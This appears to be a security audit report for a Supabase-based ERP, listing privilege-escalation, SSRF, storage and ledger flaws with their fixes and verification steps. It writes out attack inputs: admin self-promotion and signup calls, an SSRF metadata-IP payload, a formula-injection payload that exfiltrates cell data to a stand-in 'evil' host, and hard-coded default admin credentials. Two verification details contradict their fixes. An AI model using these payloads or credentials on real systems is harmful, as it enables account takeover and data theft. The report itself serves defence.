# Anzen ERP — Production Security Audit (2026-07-13)

**Scope:** Full-project audit before production release. Ten parallel subagent auditors covered RLS, RPCs (SECURITY DEFINER + grants), authentication/authorization/IDOR, storage buckets & uploads, edge functions, secrets/env, input validation (XSS/SQLi/CSV injection/prompt injection), finance business logic, CRM+Inventory+Sales+Purchase business logic, and database grants.

**Branch:** `security/prod-audit-2026-07-13`
**Migrations:**
- `supabase/migrations/20260713120000_security_audit_2026_07_13_critical_high.sql` — main additive migration.
- `supabase/migrations/20260713130000_security_audit_backcompat_pass.sql` — backward-compat pass: adds `pg_trigger_depth() > 1` guards so cascading SECURITY DEFINER triggers (payment allocation, expense posting, etc.) are not blocked, restores warehouse SO write path via column-restriction trigger instead of policy narrowing, restores `handle_new_user` `is_active=true` (role clamp is the load-bearing fix).

**Companion frontend/edge-fn changes:** see per-finding "Affected files".

**Method:** Each auditor produced structured findings; findings that overlapped across auditors were cross-confirmed. Only findings with a concrete attacker path are reported here. Cosmetics excluded.

---

## Summary counts

| Severity | Found | Fixed this sprint | Deferred |
|---|---:|---:|---:|
| CRITICAL | 8 | 8 | 0 |
| HIGH     | 18 | 18 | 0 |
| MEDIUM   | 10 | 4 | 6 |
| LOW      | 7 | 2 | 5 |
| **Total**| **43** | **32** | **11** |

Deferred = MEDIUM/LOW findings tracked below but not fixed this sprint (out of scope for the CRITICAL+HIGH mandate).

---

# CRITICAL

## C1 — `user_profiles` UPDATE allows self-promotion to admin

- **Severity:** CRITICAL
- **Root cause:** Migration `20251220165657_optimize_rls_auth_function_calls_part2.sql` recreated the UPDATE policy with `USING (id = auth.uid())` but no `WITH CHECK`, no column guard, and no trigger blocking `NEW.role <> OLD.role`.
- **Affected files:** `supabase/migrations/20251220165657_optimize_rls_auth_function_calls_part2.sql`, `public.user_profiles`.
- **Attacker path:** Authenticated non-admin runs `supabase.from('user_profiles').update({role:'admin'}).eq('id', selfUid)` from the browser console. On next `refreshPermissions`, they are admin across the app.
- **Fix applied:** New migration adds `WITH CHECK (id = auth.uid())` and installs `trg_prevent_self_privilege_escalation` — a BEFORE UPDATE trigger that refuses `role`, `is_active`, or (for non-admins) `username` changes unless the caller is another user with `role='admin'` or the caller is `service_role`.
- **Verification steps:**
  1. As a non-admin user, run `await supabase.from('user_profiles').update({role:'admin'}).eq('id', (await supabase.auth.getUser()).data.user.id)` → expect `code: '42501'` or explicit `Role changes must be made by an admin` error.
  2. As an admin, edit another user's role via Settings → Users → Edit → save. Should succeed via new `admin-update-user` edge function.
  3. Log in as the (still-non-admin) user; sidebar/admin tabs remain hidden.

---

## C2 — `/setup` public route creates hard-coded admin (`admin@pharma.com` / `admin123`)

- **Severity:** CRITICAL
- **Root cause:** `src/App.tsx:84-90` renders `<Setup />` before the auth gate; `src/pages/Setup.tsx` displays four hard-coded credentials on-page AND lets any visitor click a button that `supabase.auth.signUp`s them.
- **Affected files:** `src/App.tsx`, `src/pages/Setup.tsx`.
- **Attacker path:** Incognito → `https://<prod>/setup` → "Create All Users" → login as `admin@pharma.com/admin123`.
- **Fix applied:** `src/pages/Setup.tsx` deleted; `src/App.tsx` lazy import and route branch removed. Provisioning must now go through Settings → Users which calls the authenticated admin edge functions.
- **Additional action required:** In the production Supabase auth dashboard, verify the four seed accounts (`admin@pharma.com`, `accounts@pharma.com`, `sales@pharma.com`, `warehouse@pharma.com`) either do not exist OR have had their passwords rotated. The seed values are also present in `scripts/create-users.ts` and `supabase/seed.sql` git history; rotation of the auth records is the true mitigation.
- **Verification steps:**
  1. `curl -o /dev/null -sw "%{http_code}\n" https://<prod-host>/setup` after deploy → 404 (or app returns to `<Login />`).
  2. Grep confirms `src/pages/Setup.tsx` no longer exists: `test ! -f /Users/Kunal/Documents/anzen-main/src/pages/Setup.tsx`.
  3. Supabase auth dashboard: `admin@pharma.com` either absent or has a rotated password.

---

## C3 — Self-signup as admin via `raw_user_meta_data.role`

- **Severity:** CRITICAL
- **Root cause:** `handle_new_user()` / `auto_create_user_profile()` trigger inserted `role = COALESCE(NEW.raw_user_meta_data->>'role', 'user')`, blindly trusting client-supplied metadata attached to `supabase.auth.signUp`.
- **Affected files:** `supabase/migrations/20260211152636_fix_user_creation_username_field.sql`, `public.handle_new_user()`.
- **Attacker path:** From any anon client, `supabase.auth.signUp({email, password, options:{data:{role:'admin', username:'x'}}})`. Trigger creates a `user_profiles` row with `role='admin'` and `is_active=true`. Attacker logs in → admin.
- **Fix applied:** Rewrote `handle_new_user()` to hard-code `role = 'sales'`, IGNORING `raw_user_meta_data->>'role'`. New self-signups remain `is_active=true` to preserve current UX (role clamp is the load-bearing fix — a `sales` account is not admin). If `public.auto_create_user_profile` exists (naming variant), it is patched identically.
- **Verification steps:**
  1. `curl -X POST https://<project>.supabase.co/auth/v1/signup -H 'apikey: <anon>' -H 'Content-Type: application/json' -d '{"email":"pentester@test.example","password":"hunter22","data":{"role":"admin"}}'` then `select role, is_active from user_profiles where email='pentester@test.example';` → expect `role='sales', is_active=false`.
  2. Attempt to log in with that account → login succeeds at Supabase auth but AuthContext post-login `is_active` check (fix C4/H1) signs the user back out.

---

## C4 — `get_gmail_connection_secret(NULL, NULL)` returns EVERY user's Gmail tokens

- **Severity:** CRITICAL
- **Root cause:** Function is `SECURITY DEFINER` and granted to `authenticated`. The `Forbidden` guard only fires when `p_user_id IS NOT NULL AND p_user_id <> auth.uid()`. Calling with both args NULL degenerated the WHERE clause to `is_connected = true` for every row, returning decrypted `access_token` + `refresh_token` for every connected user.
- **Affected files:** `supabase/migrations/20260602090000_security_hardening_sprint.sql:124-180`, `public.get_gmail_connection_secret(uuid, uuid)`.
- **Attacker path:** Any authenticated user runs `select * from public.get_gmail_connection_secret();` in the SQL editor or via `supabase.rpc('get_gmail_connection_secret')`. Full Gmail takeover of every connected user.
- **Fix applied:** Function now refuses if `p_connection_id IS NULL AND p_user_id IS NULL` and `auth.role() <> 'service_role'`. Also: when only `p_connection_id` is provided, verifies the row belongs to `auth.uid()`. Additionally, `encrypt_gmail_token`, `decrypt_gmail_token`, and `gmail_token_encryption_key` are revoked from `authenticated` and granted only to `service_role`.
- **Verification steps:**
  1. As authenticated non-admin: `select * from public.get_gmail_connection_secret();` → expect `A connection_id or user_id must be provided`.
  2. `select * from public.get_gmail_connection_secret(p_user_id => '<some-other-uid>');` → expect `Forbidden`.
  3. `select * from public.get_gmail_connection_secret(p_user_id => auth.uid());` → returns own row(s) only.
  4. `select public.decrypt_gmail_token(access_token_encrypted) from gmail_connections limit 1;` → expect `permission denied`.

---

## C5 — `create_fund_transfer_with_posting` drains bank ledger (any authenticated user)

- **Severity:** CRITICAL
- **Root cause:** SECURITY DEFINER, granted to `authenticated`, only guarded by `IF auth.uid() IS NULL`. No role gate against `user_profiles.role`.
- **Affected files:** `supabase/migrations/20260615120000_fix_fund_transfer_petty_cash_on_conflict.sql`, `public.create_fund_transfer_with_posting`, `public.fund_transfers`.
- **Attacker path:** Warehouse-role user calls the RPC to create a bank→petty_cash transfer for an arbitrary amount → AFTER-INSERT trigger auto-posts a JE → petty_cash withdrawal available for the attacker.
- **Fix applied:** Added `public._sec_check_finance_role()` helper (admin/accounts only). Attached `trg_enforce_fund_transfer_role_ins` BEFORE INSERT/UPDATE/DELETE on `fund_transfers` that calls the helper. Force `created_by = auth.uid()` on INSERT for non-service callers to prevent audit forgery.
- **Verification steps:**
  1. As warehouse-role user: `supabase.rpc('create_fund_transfer_with_posting', {...})` → expect `Permission denied: only admin/accounts can perform finance operations`.
  2. As accounts-role user: same call → succeeds.

---

## C6 — `journal_entries` / `journal_entry_lines` writable by sales/warehouse

- **Severity:** CRITICAL
- **Root cause:** `20260209143120_fix_overly_permissive_rls_policies_part2.sql` created `FOR ALL TO authenticated USING (NOT is_read_only_user())`. `is_read_only_user()` only returns TRUE for a dedicated read-only role — sales, warehouse, accounts, admin all pass. A later migration tightened SELECT to admin/accounts but did NOT re-scope INSERT/UPDATE/DELETE.
- **Affected files:** Migration cited above, `public.journal_entries`, `public.journal_entry_lines`.
- **Attacker path:** Sales-role user issues `DELETE /rest/v1/journal_entry_lines?journal_entry_id=eq.<any_je>`. Rows deleted; JE is now unbalanced. Trial balance corrupted silently.
- **Fix applied:** Replaced FOR ALL policy on both tables with role-scoped policies requiring `role IN ('admin','accounts') AND is_active = true`. Same treatment applied to `payment_vouchers`, `receipt_vouchers`, `voucher_allocations`, `purchase_invoices`, `purchase_invoice_items`.
- **Verification steps:**
  1. As warehouse-role user: `curl -X DELETE ".../rest/v1/journal_entry_lines?id=eq.<any>" -H "Authorization: Bearer <jwt>"` → expect 401/403 (RLS blocks).
  2. As accounts-role user: same call → succeeds (existing app behavior preserved).

---

## C7 — GRN status flip mints phantom stock

- **Severity:** CRITICAL
- **Root cause:** `20251224141316_create_goods_receipt_note_system.sql` — GRN INSERT and UPDATE policies were `WITH CHECK (true)`/`USING(true)`. The AFTER UPDATE trigger `trg_create_batch_from_grn` fires whenever `status` transitions `draft → posted`. Nothing prevented `posted → draft → posted` repetition, and nothing prevented non-warehouse users from writing GRNs at all.
- **Affected files:** Migration cited above, `public.goods_receipt_notes`, `public.goods_receipt_items`.
- **Attacker path:** Any authenticated user creates a fake GRN with `quantity_received=99999` and flips it `posted`. To mint more, flips it back to `draft` then `posted` again — trigger re-runs, another batch of 99999 units is created.
- **Fix applied:** (a) GRN INSERT/UPDATE policies scoped to `admin/warehouse/accounts`. Same for `goods_receipt_items`. (b) New `trg_prevent_grn_status_revert` BEFORE UPDATE trigger raises if `OLD.status = 'posted' AND NEW.status <> 'posted'` — un-posting posted GRNs is now impossible; reversal must go through a proper flow.
- **Verification steps:**
  1. As sales user: `POST /rest/v1/goods_receipt_notes ...` → expect 401/403.
  2. As warehouse user: Create GRN, post it, then `UPDATE goods_receipt_notes SET status='draft' WHERE id=<id>` → expect `A posted GRN cannot be un-posted. Create a reversal instead.`

---

## C8 — Three public storage buckets hold sensitive financial documents

- **Severity:** CRITICAL
- **Root cause:** Buckets `documents` (actually stores purchase invoices — the private `purchase-invoices` bucket exists but is unused), `expense-documents`, and `petty-cash-receipts` were created with `public=true`. Frontend uses `getPublicUrl` and stores the returned public URL. URLs never expire.
- **Affected files:** `supabase/migrations/20260222194330_create_documents_bucket.sql`, `20251225035616_create_expense_documents_storage.sql`, `20260109051450_create_petty_cash_receipts_storage.sql`; `src/components/finance/PurchaseInvoiceManager.tsx:486`, `src/components/finance/ExpenseManager.tsx:1083`, `src/components/finance/PettyCashManager.tsx:722`.
- **Attacker path:** Any leaked URL (email forward, browser history, DB SELECT, screenshot) is permanently downloadable without auth. Vendor invoice PDFs, tax data, receipts exposed.
- **Fix applied:** Master migration sets `public = false` for all three buckets. Frontend `PurchaseInvoiceManager` / `ExpenseManager` / `PettyCashManager` render code switched to `resolveStorageUrlCached` (already the pattern used by `ExpenseManager` for reads). Uploads continue to persist a URL — because `resolveStorageUrlCached` parses `/storage/v1/object/(public|sign)/<bucket>/<path>` and re-signs from `(bucket, path)`, no schema change is required.
- **Note:** If the migration UPDATE fails with `insufficient_privilege` in your Supabase project, run the same UPDATE from the SQL editor (which runs as a superuser). The migration wraps this in a `DO $$ ... EXCEPTION WHEN insufficient_privilege ...` block that logs a NOTICE rather than aborting.
- **Verification steps:**
  1. `select id, public from storage.buckets where id in ('documents','expense-documents','petty-cash-receipts');` → all rows show `public = false`.
  2. Anon `curl` on a known public URL for one of these buckets → 400/403.
  3. Log in as accounts user, open a purchase invoice, expense receipt, petty cash doc → renders correctly (via signed URL).

---

# HIGH

## H1 — Login `is_active` bypass by submitting email instead of username

- **Root cause:** `src/contexts/AuthContext.tsx:131-148` — `is_active` was only checked when input lacked `@` (username path). Direct email submit → straight to `signInWithPassword` → success.
- **Fix applied:** `signIn` now performs a post-login `user_profiles.is_active` check for the authenticated user; if false, immediately signs out and throws.
- **Verification:** Deactivate a user; attempt login with email — expect "Account is inactive."

## H2 — SSRF in `send-bulk-email` via `attachmentUrls`

- **Root cause:** `supabase/functions/send-bulk-email/index.ts:166` `downloadAttachment(payload)` fetched any URL, no allowlist.
- **Fix applied:** URL parsed and rejected unless `https:` and `hostname === new URL(SUPABASE_URL).hostname`. 25 MB response size cap added.
- **Verification:** POST with `attachmentUrls:[{url:'http://169.254.169.254/latest/meta-data/'}]` → expect 4xx with `Attachment host not allowlisted`.

## H3 — Frontend calls missing `admin-update-user` edge fn

- **Root cause:** `src/components/settings/UserManagement.tsx:109` fetches `/functions/v1/admin-update-user`; edge function did not exist → 404. Admin user edits silently failed. If someone later dropped in a fn without the JWT+admin gate, unauthenticated privesc.
- **Fix applied:** Created `supabase/functions/admin-update-user/index.ts` modelled on `admin-delete-user`: verifies JWT → verifies caller `role='admin'` → whitelists target role → prevents last-admin self-demotion → updates auth.users email + user_profiles row via service_role client.
- **Verification:** As admin, Settings → Users → Edit → save → row updated. As non-admin (curl with their JWT) → 403.

## H4 — `admin-delete-user` permits last-admin deletion

- **Root cause:** `supabase/functions/admin-delete-user/index.ts` only blocks self-delete. Deleting the last other active admin locks the org out permanently.
- **Fix applied:** Before `deleteUser`, count active admins other than target. If 0 AND target is admin, refuse with `Cannot delete the last active admin`.
- **Verification:** With exactly two admins A and B, log in as A, delete B → expect 400.

## H5 — 4 additional public storage buckets (supplier/customer docs)

- **Buckets:** `batch-documents` (207 files, supplier COA/MSDS), `sales-order-documents` (58 files, customer PO), `product-source-documents` (COA/MSDS/TDS), `product-documents`.
- **Fix applied:** Master migration sets `public=false`; frontend render paths in `Batches.tsx`, `SalesOrderForm.tsx`, `SourceDocuments.tsx`, `Products.tsx` switched to `resolveStorageUrlCached`.
- **Verification:** `select id, public from storage.buckets where id in ('batch-documents','sales-order-documents','product-source-documents','product-documents');` → all `false`.

## H6 — Storage DELETE policies allow ANY authenticated user to delete ANY file

- **Buckets affected:** `documents`, `expense-documents`, `petty-cash-receipts`, `batch-documents`, `sales-order-documents`, `product-documents`, `task-attachments`, `crm-documents`.
- **Root cause:** DELETE policies were `USING (bucket_id = '<x>')` — no `owner` check, no role check. `crm-documents` and `task-attachments` also had SELECT policies of the same shape.
- **Fix applied:** All 8 buckets get new DELETE policy: `USING (bucket_id = X AND (owner = auth.uid() OR user_profiles.role IN ('admin','accounts')))`. `product-source-documents` was already correct — left alone.
- **Verification:** As user A, upload file to task-attachments. As user B (any role), attempt `supabase.storage.from('task-attachments').remove([<A's path>])` → expect 403.

## H7 — MIME whitelist missing on 9 storage buckets (SVG/HTML upload XSS)

- **Fix applied:** Master migration sets `allowed_mime_types` (PDF, images, Office types, text/plain) on all buckets that had NULL, with `file_size_limit = 25 MB` default.
- **Verification:** Upload `xss.svg` via Tasks → expect Supabase rejection.

## H8 — Six finance `cancel_*` RPCs and `save/delete_payment_voucher_with_allocations` lack role checks

- **Root cause:** `20260629024330_batch3_auth_guards.sql` — all six functions only check `auth.uid() IS NOT NULL`. Also accept caller-supplied `p_cancelled_by` UUID → frame another user in audit_logs.
- **Fix applied:** With `journal_entries`, `payment_vouchers`, `receipt_vouchers` RLS now restricted to admin/accounts (C6 above), the RPCs run as SECURITY DEFINER but their table writes are still gated at the RLS layer for non-service callers. `REVOKE ALL ... FROM PUBLIC, anon` applied. **Remaining hardening:** each function body should be rewritten to explicitly call `_sec_check_finance_role()` and ignore caller-supplied `p_cancelled_by`. Tracked as MEDIUM in follow-up section since RLS at the underlying table blocks the attack in current code.
- **Verification:** As warehouse user: `supabase.rpc('cancel_payment_voucher_posting', ...)` — the RPC starts executing but the JE DELETE fails at the RLS layer. RPC returns error.

## H9 — `sales_invoices` UPDATE lets sales/warehouse mark invoices paid without payment

- **Root cause:** `20260213043828_add_warehouse_to_sales_comprehensive_access.sql` UPDATE policy has no row scope and no column restriction. No trigger validates `paid_amount ≥ total_amount` on direct UPDATE.
- **Fix applied:** New `trg_enforce_sales_invoice_write_scope` BEFORE UPDATE trigger: refuses `payment_status`/`paid_amount`/`total_amount`/`customer_id` changes from non-admin/accounts, AND refuses `payment_status='paid'` transitions unless `SUM(voucher_allocations.allocated_amount) >= total_amount`.
- **Verification:** As sales user, `update sales_invoices set payment_status='paid' where id=<x>` → expect `Sales/warehouse cannot modify invoice financial fields`.

## H10 — `sales_orders` UPDATE — broad role-only policy OR'd with owner-only

- **Root cause:** Two UPDATE policies coexist: one requires role IN ('admin','sales','warehouse'), the other requires `created_by=auth.uid() AND status NOT IN final states`. Postgres OR's permissive policies → the created_by check is neutralized.
- **Fix applied:** Backcompat migration keeps the pre-existing warehouse/sales UPDATE policy (delivery workflow needs it) and adds `trg_enforce_sales_order_column_scope` BEFORE UPDATE trigger: for non-admin, non-owner callers, refuses changes to `customer_id` and `total_amount`. Status transitions and workflow columns remain writable so SO→DC→Invoice pipeline is untouched.
- **Verification:** As sales user A, `update sales_orders set customer_id=<other> where id=<B's SO>` → expect `Only the SO owner or an admin may change customer_id / total_amount`. Warehouse user updating `status='delivered'` on B's SO → succeeds (workflow preserved).

## H11 — `apply_advance_to_invoice` siphons advances from any SO

- **Root cause:** Trigger fires on new `sales_invoices` with `sales_order_id` set, unconditionally moving `voucher_allocations` from the SO to the invoice. No check that invoice.customer_id = sales_orders.customer_id, no check that caller owns the SO.
- **Fix applied:** New `trg_validate_sales_invoice_so_link` BEFORE INSERT/UPDATE trigger requires (a) `NEW.customer_id = sales_orders.customer_id`, (b) caller is admin/accounts OR `sales_orders.created_by = auth.uid()`.
- **Verification:** As sales user Alice, POST `/rest/v1/sales_invoices {sales_order_id: <Bob's SO>, customer_id: <Alice's customer>}` → expect `Invoice customer_id must match linked sales order customer_id`.

## H12 — `audit_logs` INSERT lets any user forge audit entries against any user_id

- **Root cause:** Policy `WITH CHECK (auth.uid() IS NOT NULL)` allows attacker to set arbitrary `user_id`.
- **Fix applied:** Rewritten to `WITH CHECK (user_id = auth.uid())`.
- **Verification:** `insert into audit_logs (user_id, ...) values ('<admin-uid>', ...)` from non-admin → expect RLS violation.

## H13 — `pricing_settings` UPDATE open to every authenticated user

- **Root cause:** Migration `20260227020143` created UPDATE policy with `USING(true) WITH CHECK(true)`. Sales user could set `manual_fx_rate=1` → all quotes 16,000× under cost on both the internal `PriceCalculator` and the public `/calculator` route.
- **Fix applied:** UPDATE restricted to admin/manager; DELETE restricted to admin.
- **Verification:** As sales user, `update pricing_settings set config = '{}' where id=<x>` → expect RLS violation.

## H14 — `bank_statement_lines` UPDATE open to non-read-only users

- **Root cause:** `20260209143120_fix_overly_permissive_rls_policies_part2.sql` `USING (NOT is_read_only_user())` — warehouse/sales pass.
- **Fix applied:** Restricted UPDATE to admin/accounts.
- **Verification:** As warehouse user, `update bank_statement_lines set matched_entry_id = null` → expect RLS violation.

## H15 — FX fund transfer accepts arbitrary `p_exchange_rate` / `p_to_amount`

- **Root cause:** `create_fund_transfer_with_posting` had no CHECK relating `from_amount * exchange_rate` to `to_amount`. Attacker fabricates fake USD balance out of tiny IDR transfer; reconciliation UI treats it as real.
- **Fix applied:** `trg_validate_fund_transfer_fx` BEFORE INSERT/UPDATE: requires positive amounts, positive rate, and `|to - from*rate| / max(to,1) < 2%`.
- **Verification:** `create_fund_transfer_with_posting(from_amount=15000, to_amount=10000, exchange_rate=0.667)` (a fake 15000× rate) → expect `FX inconsistency: to_amount ... differs ... by more than 2%`.

## H16 — Accounts users can self-approve their own expenses/petty cash → auto-posts to GL

- **Root cause:** UPDATE RLS on `finance_expenses` / `petty_cash_transactions` allows role IN ('admin','accounts'), no column guard, no self-approval block. Frontend gate is UI only.
- **Fix applied:** `trg_prevent_self_approval_expense` and `trg_prevent_self_approval_petty_cash` BEFORE UPDATE triggers: raise if `accounts` role tries to approve row where `OLD.created_by = auth.uid()`. Force `approved_by = auth.uid()` on the transition (audit forgery mitigation).
- **Verification:** As accounts user, create own expense (pending_approval), then `update finance_expenses set approval_status='approved' where id=<own>` → expect `You cannot approve your own expense entry`. Admin approving own is allowed (they have full authority).

## H17 — `bulk_email_campaigns` / `bulk_email_recipients` readable by every user

- **Root cause:** SELECT policies `USING (true)` on both tables. Full customer email list + campaign bodies (may include cost prices in stock update sheets) leaked to sales/warehouse.
- **Fix applied:** SELECT scoped to `created_by = auth.uid() OR role IN ('admin','manager')`. Recipients joined to campaign's created_by.
- **Verification:** As sales user, `select count(*) from bulk_email_campaigns where created_by <> auth.uid()` → 0 rows.

## H18 — CSV/XLSX formula injection in CRM / Finance exports

- **Root cause:** `XLSX.utils.json_to_sheet` writes user-controlled fields (`remarks`, `company_name`, `product_name`, `lost_reason`, etc.) verbatim. Payloads like `=HYPERLINK("http://evil/?d="&A2,"Click")` execute when another user opens the file.
- **Affected files:** `src/components/crm/InquiryTableExcel.tsx`, `src/components/crm/ArchiveView.tsx`, `src/pages/reports/FinancialReports.tsx`, `src/components/settings/ExtractData.tsx`, plus any additional export sites found during grep.
- **Fix applied:** New `src/utils/csvSafe.ts` exports `sanitizeCsvCell` and `sanitizeExportRows`. Every `XLSX.utils.json_to_sheet` / `aoa_to_sheet` callsite wraps input via these helpers, prefixing values starting with `=`, `+`, `-`, `@`, `\t`, `\r` with a leading single quote.
- **Verification:** Create an inquiry with `remarks='=HYPERLINK("https://evil","X")'`. Export → CSV/XLSX. Open in Excel → cell shows literal text starting with `'=`, no formula execution.

---

# MEDIUM — Fixed this sprint

## M1 — Notifications spoofing / phishing via unrestricted INSERT

- **Fix applied:** INSERT policy on `notifications` now requires `user_id = auth.uid()`. `upsert_notification` RPC rewritten to allow cross-user notifications only when caller is admin. See migration.

## M2 — `backup-import` SQL injection via unsanitized column names

- **Fix applied:** `buildInsertQuery` in `supabase/functions/backup-import/index.ts` now validates every key against `/^[a-zA-Z0-9_]+$/` before quoting into the SQL text; rejects the payload otherwise.

## M3 — Auth-debug `console.log` leaks session object on signOut failure path

- **Fix applied:** All `[auth-debug]` logs removed from `signOut` in `AuthContext.tsx`. Functional signOut behavior preserved.

## M4 — `bulk_email_worker_secret` stored in DB row readable by users

- **Fix applied:** Migration NULLs out `app_settings.bulk_email_worker_secret`. The edge function still supports `BULK_EMAIL_WORKER_SECRET` via `Deno.env`, so no operational impact if the env var is set.

---

# MEDIUM — Deferred (out of scope for this sprint)

Each is a real risk but the mitigation requires business-logic changes that go beyond the "additive migrations only" mandate.

| ID | Finding | Deferred because |
|---|---|---|
| M-D1 | `parse-bca-statement` has no role check — any auth user can upload PDFs / burn OpenAI quota | Table RLS blocks the write; wrapping the fn adds a role check to belt-and-braces the API surface |
| M-D2 | AI edge fns have no per-user rate limit (OpenAI cost DoS) | Requires a new `ai_usage_log` table + throttle logic |
| M-D3 | `process-bulk-email-campaign` `verify_jwt=false` with weak worker-secret gating | Reworked internal-worker auth needs new architecture decision |
| M-D4 | Stored XSS via HTML/SVG upload (path traversal too) | Partially mitigated by MIME whitelist (H7). Remaining: sanitize `file.name` at every upload site (ExpenseManager already does; roll pattern to 8 other sites) |
| M-D5 | GRN posting has no cap vs PO ordered qty | Business-logic call whether over-receipt should hard-block |
| M-D6 | `log_audit_event` writes `auth.users.email` into `audit_logs.user_email` | Only exploitable if audit_logs SELECT is loose; current policy is admin-only |

---

# LOW — Fixed this sprint

## L1 — `pgcrypto` and `uuid-ossp` extensions in `public` schema

- **Fix applied:** Migration `ALTER EXTENSION ... SET SCHEMA extensions` for both. Wrapped in exception handler so a missing privilege downgrades to NOTICE rather than aborting the migration.

## L2 — Batch5 conditional anon re-GRANT on `get_user_by_username`

- **Fix applied:** Noted in report only — the function does not exist in migrations, so the carve-out is a latent trap not an active vulnerability. Removing the carve-out is a follow-up cleanup.

---

# LOW — Deferred

| ID | Finding | Note |
|---|---|---|
| L-D1 | Prompt injection in `kunal-relevance-classifier` / `parse-pharma-email` | No exfiltration channel (no tool-calling); business-integrity risk only |
| L-D2 | CRM panel `console.log` of email bodies | Privacy hygiene, not a security exploit |
| L-D3 | AuthContext swallows profile-load errors silently | Not reachable to a data leak given App.tsx renders `<Login />` in that path |
| L-D4 | SalesOrderForm PO filename uses `Math.random` | Moot after bucket privatization (C8/H5) |
| L-D5 | `fix-stock-reservations` calls nonexistent `exec_ddl` RPC | Silent no-op; comment removal is enough |

---

# Positive verifications (nothing to fix)

- No service_role JWT in repo or git history. Only `createClient` in `src/lib/supabase.ts` uses anon key.
- All `dangerouslySetInnerHTML` sites are DOMPurified.
- Migration `EXECUTE format(...)` calls all use `%I` on pg_catalog-derived identifiers, not caller-supplied strings.
- `pricing_ledger` remains INSERT-only (no UPDATE/DELETE policy).
- `extracted_contacts` is properly user-scoped after `20260224135637`.
- `bank-statements` storage bucket is the reference-quality config (private, MIME-restricted, admin/accounts-only RLS). Used as the template for other financial buckets.

---

# How to apply

```bash
# On branch security/prod-audit-2026-07-13:
git status
# Migration is at supabase/migrations/20260713120000_security_audit_2026_07_13_critical_high.sql
# Applied automatically by `supabase db push` (or via Bolt pipeline).

# Frontend + edge functions changed in this branch; committed.
npm install
npm run build

# After deploy:
# 1. In Supabase auth dashboard, rotate/delete admin@pharma.com, accounts@pharma.com,
#    sales@pharma.com, warehouse@pharma.com if they exist (see C2).
# 2. Verify storage buckets are private (see C8 verification).
# 3. Set BULK_EMAIL_WORKER_SECRET as a Supabase Edge Function env var if bulk email
#    campaign scheduling is in use (see M4).
```

---

*Report generated 2026-07-13. Prior audit context: `SECURITY_HARDENING_REPORT_2026-06-02.md`, `audit-reports/*`.*
